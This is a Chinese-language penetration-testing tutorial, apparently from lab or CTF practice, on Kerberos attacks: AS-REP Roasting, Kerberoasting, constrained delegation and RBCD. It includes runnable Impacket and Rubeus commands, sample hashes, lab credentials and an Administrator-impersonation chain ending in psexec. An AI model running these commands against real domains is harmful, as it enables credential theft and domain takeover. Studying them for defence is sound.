---
title: "Kerberos 攻击"
date: 2026-06-05 00:00:00 +0800
categories: [渗透]
tags: [kerberos, 域渗透]
---

![1778065969110](/assets/kerberos-attack/1778065969110.png)

### 名词解释:

```
KDC: Key Distribution Center，密钥分发中心，负责管理票据、认证票据、分票据，但是KDC不是一个独立的服务，它由AS和TGS组成。

AS: Authentication Service，验证服务，为client生成TGT的服务

TGS: Ticket Granting Service，票据授予服务，为client生成某个服务的ticket

TGT: Ticket Granting Ticket，入场券，通过入场券能够获得票据，是一种临时凭证的存在。

Ticket:票据，是网络中各对象之间互相访问的凭证

AD: Account Database，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。

DC: Domain Controller，域控

KRBTGT: 每个域控制器都有一个krbtgt账户，是KDC的服务账户，用来创建TGS加密的密钥。
```

ST和TGT均由KDC发放，因为KDC运行在域控上，所以TGT和ST也均由域控发放

KDC包含AS（Authentication Server，认证服务器）和TGS（Ticket Granting Server，票据授权服务器）

Kerberos协议有两个基础认证模块：AS_REQ&AS_REP 和 TGS_REQ&TGS_REP，以及微软扩展的两个认证模块S4U和PAC

S4U是微软为了实现委派而扩展的模块，分为S4u2Self和S4u2Proxy。

PAC包含各种授权信息、附加凭据信息、配置文件和策略信息等，例如用户所属的用户组、用户所具有的权限等。

在一个正常的kerberos认证流程中，KDC返回的TGT的ST都带有PAC

### 1. AS-REP Roasting (无需预身份验证爆破)

这是最简单的域内打法之一，**通常在获取域控 IP 后、还没有任何有效凭据（或只有一个极低权限账号）时使用。**

- **核心原理：** 默认情况下，用户申请 TGT 前需要用自己的密码 Hash 加密一个时间戳发送给 KDC（这叫预认证）。如果管理员在 AD 中勾选了**“不需要 Kerberos 预身份验证 (DONT_REQ_PREAUTH)”**，任何人都可以直接向 KDC 请求该用户的 AS-REP 响应。响应包中包含一段用该用户密码 Hash 加密的数据，攻击者可以拿到本地离线爆破。
- **攻击前提：** 只需要能与域控所在网络的 88 端口（Kerberos）通信即可（知道目标用户名即可，有时甚至可以通过枚举用户名盲打）。

**通用步骤 (SOP)：**

1. **收集/定位目标：**

   - *Linux (Impacket)*: 尝试请求域内所有用户的 AS-REP（需要提供已知用户名列表，或者用已有的低权限域账号查） `proxychains4 impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/ `
   - *Windows (Rubeus)*: Rubeus.exe asreproast /domain:wisdom /format:john /outfile:hash.txt

2. **离线爆破：**

   - 使用 Hashcat 对获取到的 Hash 进行字典爆破： `hashcat -m 18200 hash.txt pass.txt`

   - 或者用john

     ```
     echo "$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:c1f3f661b3e13330c72d06c7ae0e4d8b$06839251bdb7f64fbbc06a0e5c73e05358b593b2587eed530276c24ca0e501b8f33c6e7470a30b8f79f3ada9fafedffd1c6c8b10ac449b6289795b3a30985083d1a1b00a3c6a23cf472db6575c8f836180245a35e425c9ed4985162c24950736f5c5e12328ae6e9265efe926b557e20845cb2ef42f3f32d8ee5ac4158a15141f5d53d474f038a110dde7e0b5456be545ea06c816f0e4913472d60b933ffe84fc9be9b1a27f10288ff380f7036917c2ca23862f39eee7cecd0d3d1bedcef9460d7f5892a0b76a86ac2cd89cb6cd507e0aaea0ed8b3c23abe282a7bcd4e3ebee77f435544a44e0bd36ddc5216c" > hash.txt
     ```

     ```
     john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
     ```

     ```
     john --show --format=krb5asrep hash.txt
     ```

     krb5tgs

------

### 2. Kerberoasting (服务票据爆破)

与 AS-REP Roasting 类似，但它针对的是**服务账号（Service Accounts）**。

- **核心原理：** 任何经过身份验证的域用户，都可以向 KDC 请求访问任何服务的服务票据（ST）。这张 ST 的一部分是用**该服务账号的 NTLM Hash** 加密的。攻击者申请 ST 后，将其导出并离线爆破，从而获得该服务账号的明文密码。
- **攻击前提：** 必须拥有一个普通的、有效的域用户账号及密码/Hash（作为立足点）。

**通用步骤 (SOP)：**

1. **定位注册了 SPN 的用户：**
   - *Linux (Impacket)*: 自动查询并请求票据 `proxychains4 impacket-GetUserSPNs  sentiment.com/user:password -dc-ip 172.x.x.x -request `
   - *Windows (Rubeus)*: `Rubeus.exe kerberoast /outfile:hashes.txt`
2. **离线爆破：**
   - 获取到以 `$krb5tgs$` 开头的 Hash 后，使用 Hashcat 爆破
   - 或者john

------

### 3. 约束委派 (Constrained Delegation / S4U2Self & S4U2Proxy)

为了解决非约束委派过于危险的问题，微软推出了约束委派。服务 A 只能代替用户去访问**指定的**服务 B（配置在 `msDS-AllowedToDelegateTo` 属性中）。

- **核心原理：** 攻击者如果拿下了**配置了约束委派的服务账号A** 的密码或 Hash，就可以利用 Kerberos 的 S4U 扩展协议伪造任意用户（如域管 Administrator）去访问它被允许访问的服务 B。
- **攻击前提：** 获得配置了约束委派的账号权限（密码或 NTLM Hash）。

**通用步骤 (SOP)：**

1. **查询约束委派用户：**

   - 查询哪些机器或账号有 `msDS-AllowedToDelegateTo` 属性。
   - *AdFind*: `AdFind.exe -b "DC=sentiment,DC=com" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto`

2. **申请 TGT 并伪造票据 (以 Impacket 为例)：**

   - 假设拿下了服务账号 WebSvc 的 Hash，它被允许委派到域控的 CIFS 服务。

   - 利用 `getST.py`（S4U2Self + S4U2Proxy 过程全自动）： `impacket-getST -dc-ip <DC_IP> -spn cifs/dc.sentiment.com -impersonate Administrator sentiment.com/WebSvc -hashes :<WebSvc_Hash>`

   - 或者用

     ```
     Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:6fdb5239210dcd8cf65aaedf54efff5f /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap > TGT.txt
     ```

   ```
   Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:<base64编码TGT>
   ```

   ![1777132991046](/assets/kerberos-attack/1777132991046.png)

3. **注入并利用：**

   - 上一步会生成一个 `Administrator.ccache` 缓存文件。
   - 导入环境变量：`export KRB5CCNAME=Administrator.ccache`
   - 随后即可利用 Administrator 权限访问域控文件共享：`smbclient.py -k -no-pass dc.sentiment.com`

------

### 4. 基于资源的约束委派 (RBCD)

**一般看到GenericWrite权限,就是RBCD**

**约束委派是“正向”的特权，而 RBCD 是“反向”的受控。**

这是近年来比赛和实战中极其热门的高阶考点。

- **核心原理：** 传统的约束委派是“服务 A 规定自己能去哪（服务 B）”，需要域管权限才能配置。而 RBCD 是“服务 B (资源) 自己规定谁（服务 A）能来访问我”，只需要对服务 B（目标机器）具有**属性写入权限**（`WriteProperty`）即可配置。
- **攻击前提：** 拥有目标机器属性的写入权限（常见途径：利用 Web 漏洞拿下某台机器的 SYSTEM，或者利用 NTLM Relay 强制目标机器认证到 LDAP 服务器）。

**通用步骤 (SOP)：**

1. **拥有写入权限：** 假设攻击者控制了普通用户 UserA，且 UserA 对目标机器 TargetPC 有写权限。
2. **创建虚假计算机账号：** 攻击者在域内创建一个自己控制的机器账号（默认域用户有权创建 10 个机器账号）。
   - `proxychains4 -q impacket-addcomputer -computer-name 'hunsil$' -computer-pass 'Abc123456' -dc-host XR-DC01.xiaorang.lab -dc-ip 172.22.15.13 "xiaorang.lab/lixiuying:winniethepooh"`
3. **写入委派属性 (利用 RBCD)：**
   - 将 FAKEPC$ 的 SID 写入 TargetPC 的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性。
   - `proxychains4 -q impacket-rbcd xiaorang.lab/lixiuying:winniethepooh -action write -delegate-from "hunsil$" -delegate-to "XR-0687$" -dc-ip 172.22.15.13`
4. **伪造票据并攻击：**
   - 使用刚创建的 hunsil$ 的密码，通过 S4U 协议伪造域管访问 TargetPC。
   - `proxychains4 -q impacket-getST xiaorang.lab/hunsil$:'Abc123456' -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13`
   - 导入 `.ccache` 凭证，利用 `psexec.py` 或 `wmiexec.py` 拿下 TargetPC。

```
export KRB5CCNAME=Administrator.ccache
```

```
proxychains4 -q impacket-psexec 'xiaorang.lab/administrator@XR-0687.xiaorang.lab' -target-ip 172.22.15.35 -codec gbk -no-pass -k
```





如果把Kerberos中的票据类比为一张火车票，那么Client端就是乘客，Server端就是火车，而KDC就是就是车站的认证系统。如果Client端的票据是合法的（由你本人身份购买并由你本人持有）同时有访问Server端服务的权限（车票对应车次正确）那么你才能上车。当然和火车票不一样的是Kerberos中有存在两张票，而火车票从头到尾只有一张。

KDC又分为两个部分：

Authentication Server： AS的作用就是验证Client端的身份（确定你是身份上的本人），验证通过就会给一张TGT（Ticket Granting Ticket）票给Client。
Ticket Granting Server： TGS的作用是通过AS发送给Client的票（TGT）换取访问Server端的票（上车的票ST）。ST（Service Ticket）也有资料称为TGS Ticket，为了和TGS区分，在这里就用ST来说明。

**TGT 是进入园区的“大门票”，而 ST 是玩具体项目的“小门票”**

**密码**换 **TGT**，用 **TGT** 换 **ST**，最后用 **ST** 访问**资源**。





